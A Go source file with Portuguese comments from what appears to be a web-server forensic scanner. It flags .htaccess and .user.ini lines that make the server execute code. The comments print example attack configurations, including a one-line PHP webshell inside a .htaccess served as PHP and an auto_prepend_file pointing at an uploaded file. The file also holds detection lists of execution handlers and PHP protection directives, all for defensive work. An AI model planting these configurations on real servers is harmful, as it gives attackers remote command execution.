package facts

import "strings"

// Configuração POR DIRETÓRIO do servidor web: `.htaccess` e `.user.ini`.
//
// # O buraco que isto fecha
//
// A ferramenta já procurava `auto_prepend_file` — a diretiva que faz o PHP
// executar um arquivo antes de CADA requisição, em qualquer rota — e procurava
// só em `/etc/php*`. Ou seja: no lugar onde é preciso ser root para escrever.
//
// A MESMA diretiva existe por diretório, dentro do web root, num arquivo que
// quem faz upload consegue criar:
//
//	php_value auto_prepend_file /var/www/uploads/.i.php   (.htaccess)
//	auto_prepend_file = /var/www/uploads/.i.php           (.user.ini)
//
// E existe a forma em que o arquivo de configuração É o backdoor, sem precisar
// de um segundo arquivo nenhum:
//
//	AddType application/x-httpd-php .htaccess
//	# <?php system($_GET['cmd']); ?>
//
// A primeira linha faz o Apache servir o PRÓPRIO .htaccess como PHP. A segunda
// é comentário para o Apache e código para o PHP. O webshell inteiro cabe no
// arquivo de configuração, e ele passava por baixo dos DOIS lados desta
// ferramenta ao mesmo tempo: o coletor de gatilhos não olhava fora de /etc/php,
// e a varredura de código seleciona por EXTENSÃO — `.htaccess` não tem.
//
// # Por que viaja na fila da varredura de código
//
// Estes arquivos moram espalhados pela árvore servida, em profundidade
// arbitrária. Uma segunda caminhada pagaria de novo o I/O que a varredura de
// código já paga, e teria os próprios tetos, a própria poda e o próprio jeito
// de truncar. Selecionar na mesma passada custa uma comparação de nome por
// dirent e herda os limites que já estão declarados.

// ConfigWeb é um arquivo de configuração por diretório encontrado dentro de uma
// árvore servida.
type ConfigWeb struct {
	Path string `json:"path"`
	// Tipo é "htaccess" ou "user.ini". A sintaxe é diferente, e a conclusão
	// para o operador também: o .htaccess configura o SERVIDOR e o .user.ini
	// configura o PHP.
	Tipo   string `json:"kind"`
	ModUTC string `json:"mod_utc,omitempty"`

	Linhas []LinhaConfigWeb `json:"lines,omitempty"`
}

// LinhaConfigWeb é uma linha que muda o que o servidor EXECUTA. Linha que só
// configura cache, compressão ou reescrita de URL não entra: a coleta é do que
// tem consequência de execução, e guardar o resto encheria o dump com a
// configuração normal de toda aplicação PHP do mundo.
type LinhaConfigWeb struct {
	N    int    `json:"line"`
	Text string `json:"text"`

	// Motivo é a classe, e é o que o check lê para decidir a conclusão:
	//
	//	prepend   o PHP executa um arquivo antes/depois de CADA requisição
	//	handler   um mapeamento faz o servidor EXECUTAR o que não executava
	//	codigo    o próprio arquivo de configuração contém código PHP
	//	expoe     a configuração torna os próprios `.ht*` servíveis pela web
	//	afrouxa   a linha mexe numa diretiva de PROTEÇÃO do PHP. Se ela chega a
	//	          valer NESTE arquivo é pergunta do check — a maioria delas é
	//	          PHP_INI_SYSTEM e não vale
	//	cgi       execução de CGI/SSI é habilitada neste diretório
	Motivo string `json:"why"`

	// Alvo é o operando: o arquivo do prepend, a extensão do handler.
	Alvo string `json:"target,omitempty"`
}

// configWebPorNome reconhece os dois nomes. Vazio para todo o resto — é o
// filtro que mantém a seleção barata (uma comparação de string por dirent).
func configWebPorNome(nome string) string {
	switch nome {
	case ".htaccess":
		return "htaccess"
	case ".user.ini":
		return "user.ini"
	}
	return ""
}

// phpProtecoes são as diretivas de PROTEÇÃO do PHP — as que decidem se
// `system()` existe e até onde o interpretador enxerga.
//
// O nome do motivo continua sendo "afrouxa" por compatibilidade de dump: quem
// decide se a linha AFROUXA alguma coisa é o check, e não este mapa. A
// diferença não é cosmética — a maioria destas diretivas é PHP_INI_SYSTEM, e
// escrita num `.user.ini` ou num `.htaccess` o PHP simplesmente a IGNORA.
// Ver checks/configweb.go (phpPorDiretorio), que faz essa leitura e por isso
// alcança também os dumps já gravados.
//
// O que este mapa faz é SELECIONAR a linha para o dump: guardá-la é certo em
// qualquer dos casos, porque ela diz algo sobre quem a escreveu.
var phpProtecoes = map[string]bool{
	"disable_functions": true, "disable_classes": true,
	"open_basedir": true, "allow_url_include": true, "allow_url_fopen": true,
}

var phpPrepend = map[string]bool{
	"auto_prepend_file": true, "auto_append_file": true,
}

// analisarConfigWeb lê o arquivo e devolve só o que tem consequência de
// execução. Devolve nil quando não há nada — a maioria dos .htaccess do mundo
// só faz reescrita de URL, e guardá-los todos seria ruído no dump.
func analisarConfigWeb(path, tipo, conteudo string) *ConfigWeb {
	cw := &ConfigWeb{Path: path, Tipo: tipo}
	// O bloco `<Files ~ "^\.ht">` e a permissão que o acompanha são lidos como
	// PAR, com escopo: `Require all granted` fora do bloco é a configuração
	// normal de um diretório público e não diz nada sobre os `.ht*`. Sem o
	// escopo, um .htaccess que NEGA os .ht num bloco e libera o diretório em
	// outro saía acusado — que é a configuração recomendada, ao contrário.
	dentroDeHt, filesHtLinha := false, 0
	liberaTodos := false

	for i, raw := range strings.Split(conteudo, "\n") {
		n := i + 1
		ln := strings.TrimSpace(raw)
		if ln == "" {
			continue
		}

		// A TAG DE PHP É PROCURADA NA LINHA CRUA, inclusive dentro do que o
		// Apache considera comentário — e é justamente ali que ela mora.
		//
		//	# <?php system($_GET['cmd']); ?>
		//
		// O `#` faz o Apache ignorar a linha ao ler a configuração. Quando o
		// mesmo arquivo é SERVIDO como PHP, o interpretador não sabe nada de
		// `#`: ele procura `<?` e executa o que vem depois. Pular comentário
		// antes de procurar a tag apagaria exatamente a forma que se usa.
		if j := strings.Index(ln, "<?"); j >= 0 {
			cw.Linhas = append(cw.Linhas, LinhaConfigWeb{
				N: n, Text: trecho(ln), Motivo: "codigo",
			})
			continue
		}

		if strings.HasPrefix(ln, "#") || strings.HasPrefix(ln, ";") {
			continue
		}

		if tipo == "user.ini" {
			nome, valor, ok := strings.Cut(ln, "=")
			if !ok {
				continue
			}
			nome = strings.ToLower(strings.TrimSpace(nome))
			valor = strings.Trim(strings.TrimSpace(valor), `"'`)
			switch {
			case phpPrepend[nome] && valor != "" && valor != "none":
				cw.Linhas = append(cw.Linhas, LinhaConfigWeb{
					N: n, Text: trecho(ln), Motivo: "prepend", Alvo: valor,
				})
			case phpProtecoes[nome]:
				cw.Linhas = append(cw.Linhas, LinhaConfigWeb{
					N: n, Text: trecho(ln), Motivo: "afrouxa", Alvo: valor,
				})
			}
			continue
		}

		campos := strings.Fields(ln)
		if len(campos) == 0 {
			continue
		}
		dir := strings.ToLower(campos[0])
		low := strings.ToLower(ln)

		switch {
		// php_value / php_admin_value / php_flag / php_admin_flag <nome> <valor>
		case strings.HasPrefix(dir, "php_") && len(campos) >= 2:
			nome := strings.ToLower(campos[1])
			valor := ""
			if len(campos) >= 3 {
				valor = strings.Trim(strings.Join(campos[2:], " "), `"'`)
			}
			switch {
			case phpPrepend[nome] && valor != "" && valor != "none":
				cw.Linhas = append(cw.Linhas, LinhaConfigWeb{
					N: n, Text: trecho(ln), Motivo: "prepend", Alvo: valor,
				})
			case phpProtecoes[nome]:
				cw.Linhas = append(cw.Linhas, LinhaConfigWeb{
					N: n, Text: trecho(ln), Motivo: "afrouxa", Alvo: valor,
				})
			}

		// AddType / AddHandler / SetHandler / Action: o mapeamento que decide o
		// que o servidor EXECUTA em vez de entregar como arquivo.
		// AddType / AddHandler / SetHandler: o mapeamento que decide o que o
		// servidor EXECUTA em vez de entregar como arquivo.
		//
		// O `Action` FICOU DE FORA, e é um negativo medido. A gramática dele é
		// `Action <tipo-mime> <url-do-script-cgi>` — o segundo operando é uma
		// URL, não uma lista de extensões. Lê-lo como extensão transformava a
		// linha mais banal de hospedagem compartilhada com PHP-CGI —
		//
		//	Action application/x-httpd-php5 /cgi-bin/php5-cgi
		//
		// — em CRÍTICO, com a evidência "as extensões mapeadas NÃO são da
		// família php: ./cgi-bin/php5-cgi". E o `Action` sozinho não torna nada
		// executável: ele diz COMO rodar um tipo mime que outra diretiva
		// precisa ter atribuído antes. Quem atribui é o AddType/AddHandler, que
		// está coberto.
		case dir == "addtype" || dir == "addhandler" || dir == "sethandler":
			if !executaAlgumaCoisa(low) {
				break
			}
			// O alvo é a EXTENSÃO mapeada — o que vem depois do handler. No
			// SetHandler não há extensão: ele vale para o escopo inteiro.
			alvo := strings.Join(campos[2:], " ")
			if dir == "sethandler" {
				alvo = "(o diretório inteiro)"
			}
			cw.Linhas = append(cw.Linhas, LinhaConfigWeb{
				N: n, Text: trecho(ln), Motivo: "handler", Alvo: alvo,
			})

		// Options: liga (ou desliga) execução de CGI e de SSI.
		case dir == "options":
			if ligaExecucao(campos[1:]) {
				cw.Linhas = append(cw.Linhas, LinhaConfigWeb{
					N: n, Text: trecho(ln), Motivo: "cgi",
				})
			}

		// <Files ~ "^\.ht"> — o bloco que libera os próprios arquivos de
		// configuração. Sozinho não conclui nada; conclui junto com a
		// permissão, DENTRO do mesmo bloco.
		case strings.HasPrefix(dir, "<files"):
			if strings.Contains(low, ".ht") {
				dentroDeHt, filesHtLinha = true, n
			}
		case strings.HasPrefix(dir, "</files"):
			dentroDeHt = false
		case dentroDeHt && (strings.Contains(low, "allow from all") ||
			strings.Contains(low, "require all granted")):
			liberaTodos = true
		}
	}

	// A COMBINAÇÃO é o sinal. O Apache já nega `.ht*` de fábrica desde a 2.4;
	// reverter essa negação DENTRO de um .htaccess não tem uso legítimo — é o
	// passo de que o webshell-no-próprio-.htaccess precisa para ser alcançável
	// pela URL.
	if liberaTodos {
		cw.Linhas = append(cw.Linhas, LinhaConfigWeb{
			N: filesHtLinha, Motivo: "expoe",
			Text: "<Files ~ \"^\\.ht\"> … (permissão liberada no mesmo arquivo)",
		})
	}

	if len(cw.Linhas) == 0 {
		return nil
	}
	return cw
}

// executaAlgumaCoisa diz se o handler citado FAZ o servidor executar. Um
// `AddType text/plain .log` é configuração de conteúdo e não interessa.
func executaAlgumaCoisa(low string) bool {
	for _, h := range []string{
		"x-httpd-php", "php-script", "application/x-httpd",
		"cgi-script", "fcgid-script", "wsgi-script", "server-parsed",
		"proxy:unix:", "proxy:fcgi:",
	} {
		if strings.Contains(low, h) {
			return true
		}
	}
	return false
}

// ligaExecucao lê os tokens de um `Options` respeitando o SINAL de cada um.
//
// A leitura anterior era `strings.Contains(low, "execcgi")`, e ela dizia o
// CONTRÁRIO do fato numa linha de endurecimento:
//
//	Options -ExecCGI -Includes -Indexes
//
// saía como "execução de CGI/SSI é habilitada neste diretório". Afirmar o
// inverso do que o arquivo diz é pior que não olhar para ele — quem lê o
// relatório vai desfazer a proteção.
//
// `IncludesNOEXEC` é o SSI sem execução de comando, e por isso não conta; ele
// contém "includes" como substring, que é outra forma de a leitura por
// substring errar.
func ligaExecucao(tokens []string) bool {
	for _, t := range tokens {
		sinal := byte('+')
		if len(t) > 0 && (t[0] == '+' || t[0] == '-') {
			sinal, t = t[0], t[1:]
		}
		if sinal != '+' {
			continue
		}
		switch strings.ToLower(t) {
		case "execcgi", "includes":
			return true
		}
	}
	return false
}
